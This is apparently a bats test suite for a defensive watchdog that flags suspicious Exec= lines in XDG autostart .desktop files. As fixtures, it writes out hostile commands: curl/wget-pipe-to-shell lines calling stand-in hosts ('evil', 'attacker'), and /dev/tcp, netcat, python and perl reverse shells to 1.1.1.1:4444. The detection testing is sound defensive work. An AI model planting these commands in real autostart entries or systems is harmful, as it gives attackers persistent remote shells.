#!/usr/bin/env bats
# L2 bats functional tests for the xdg-autostart-watchdog scan script.
#
# A .desktop file in an autostart dir runs its `Exec=` at the start of every
# desktop session (root's session for /root/.config/autostart, every
# session for /etc/xdg/autostart) — a login/session persistence vector. An
# Exec under a writable root, relative-with-slash, or carrying an injection
# pattern is alert; bare PATH-resolved commands are normal.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# autostart dir in a tmp sandbox via SELFDEF_XDG_DIRS.
#
# Run with: bats packaging/test/L2-xdg-autostart-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd/xdg-autostart-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    AUTOD="${TMP}/autostart"; mkdir -p "${AUTOD}"
    DESK="${AUTOD}/app.desktop"
}

teardown() { rm -rf "${TMP}"; }

desktop() { printf '[Desktop Entry]\nType=Application\nName=App\nExec=%s\n' "$1"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_XDG_PROFILE="${PROFILE:-report}" \
    SELFDEF_XDG_BASELINE="${BASELINE}" \
    SELFDEF_XDG_DIRS="${DIRS:-$AUTOD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no autostart dirs → ok / no_autostart_dirs" {
    DIRS="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_autostart_dirs"'
    cap | grep -q '"severity":"ok"'
}

@test "benign autostart entry, first run → ok / baseline_initial" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / xdg_autostart_intact" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xdg_autostart_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "Exec under a writable root → alert / xdg_autostart_suspicious" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd                                   # benign baseline
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"xdg_autostart_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "Exec carrying a curl|sh payload → alert" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "curl http://evil|sh"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a relative-with-slash Exec → alert" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop ./rel/x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign Exec change → warn / xdg_autostart_changed" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /usr/bin/blueman-applet > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"xdg_autostart_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "a /usr/bin Exec is NOT flagged" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a bare PATH-resolved Exec is NOT flagged" {
    desktop 'pulseaudio --start' > "${DESK}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    desktop /usr/bin/nm-applet > "${DESK}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious Exec" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — xdg-autostart inventory enumerates per-session exec surface)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (Exec under /var/tmp): writable-root expansion" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /var/tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (Exec under /dev/shm): tmpfs writable-root coverage" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /dev/shm/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (reverse-shell pattern in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "wget -qO- http://attacker/p | sh"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in Exec)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'sh -c "echo YmFzaCAtaQ== | base64 -d | bash"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable .desktop file → alert)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    chmod 0666 "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-xdg-autostart -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no-auto-trust: xdg-autostart-watchdog does NOT refresh baseline on suspicious-Exec detection — alert STAYS until operator updates)" {
    # Login/session persistence primitive — alert MUST persist
    # across runs until operator explicitly re-baselines. Sister to
    # sshd-config, sudo-conf, gss-mech, ld-preload, nm-vpn-plugin,
    # openvpn-config — active-injection class never auto-trusts.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /tmp/.x > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: a second autostart dir ALSO scanned — both /etc/xdg/autostart + ~/.config/autostart)" {
    # xdg-autostart consults BOTH /etc/xdg/autostart (system) and
    # ~/.config/autostart (per-user). Both may carry attacker-planted
    # .desktop files — watchdog must enumerate every dir in
    # SELFDEF_XDG_DIRS.
    AUTOD2="${TMP}/autostart.user"; mkdir -p "${AUTOD2}"
    desktop /usr/bin/nm-applet > "${DESK}"
    DIRS="${AUTOD} ${AUTOD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    desktop /tmp/user-evil > "${AUTOD2}/user-app.desktop"
    DIRS="${AUTOD} ${AUTOD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant in Exec — sister to wget-pipe-sh axis)" {
    # Attacker may swap wget→curl and sh→bash. Both downloader-
    # tool and shell variants must trigger.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop 'bash -c "curl -fsSL http://attacker/p | bash"' > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (Exec under /home: user-writable hijack coverage)" {
    # Operator's home dir is a writable-root variant. Symmetric to
    # /tmp + /var/tmp + /dev/shm axes already locked.
    desktop /usr/bin/nm-applet > "${DESK}"
    run_wd
    desktop /home/user/evil > "${DESK}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in Exec: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to many other watchdog's nc reverse-shell variant
    # INVARIANTs across the brain. XDG autostart .desktop entries
    # are run on every graphical login by every user (and per-
    # user autostart by the user's own login). T1547.013 — XDG
    # Autostart Entries; recurring trigger fires once per
    # graphical login session, and on a multi-user host that's
    # multiple times per day.
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=nc -e /bin/sh 1.1.1.1 4444\n' > "${AUTOD}/evil.desktop"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on XDG autostart surface)" {
    # Sister to nc / curl|bash / dev-tcp XDG autostart variants.
    # Python on every Debian/Ubuntu desktop. Locks python axis on
    # T1547.013 XDG Autostart per-graphical-login persistence.
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${AUTOD}/evil.desktop"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on XDG autostart surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp XDG
    # autostart variants. Perl on every Debian/Ubuntu desktop.
    # Locks perl axis on T1547.013 XDG Autostart per-graphical-
    # login persistence — runs AS user on every desktop session
    # start.
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${AUTOD}/evil.desktop"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on xdg-autostart surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The xdg-autostart-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1547.013 XDG Autostart per-graphical-login
    # persistence alert. Locks parser contract on the .desktop
    # Exec= detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '[Desktop Entry]\nType=Application\nExec=/usr/bin/gnome-keyring\n' > "${AUTOD}/benign.desktop"
    run_wd                                              # ok path
    printf '[Desktop Entry]\nType=Application\nExec=/tmp/.evil\n' > "${AUTOD}/evil.desktop"
    run_wd                                              # alert path
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: xdg-autostart-watchdog NEVER deletes .desktop entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # xdg-autostart-watchdog DETECTS T1547.013 XDG Autostart
    # per-graphical-login persistence but MUST NEVER emit rm/
    # unlink commands to auto-clean the .desktop file. The
    # detected entry may be operator-legitimate (custom session
    # startup tool, screen-lock helper, notification daemon).
    # Silent auto-delete would destroy operator baseline state
    # AND could break operator's daily desktop workflow.
    # Surveillance, never remediation. Locks anti-data-loss
    # contract on the xdg-autostart surveillance substrate.
    printf '[Desktop Entry]\nType=Application\nExec=/tmp/.evil\n' > "${AUTOD}/evil.desktop"
    run_wd
    [ -f "${AUTOD}/evil.desktop" ]
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(AUTOD|FILE|file)'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # xdg-autostart-watchdog runs ON the timer's scheduled fire
    # — scans /etc/xdg/autostart + per-user ~/.config/autostart
    # for Exec= injection patterns in .desktop entries, emits a
    # verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the xdg-autostart-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd/selfdef-xdg-autostart.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. xdg-autostart-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # xdg-autostart-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # xdg-autostart-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'xdg-autostart-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: xdg-autostart-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. xdg-autostart-watchdog is a DETECT-only watchdog: surveils +
    # emits verdicts, NEVER writes back. Locks no-auto-fix on
    # the xdg-autostart-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (xdg-autostart-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the xdg-autostart-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # xdg-autostart-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # xdg-autostart-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (xdg-autostart-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the xdg-autostart-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/xdg-autostart-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
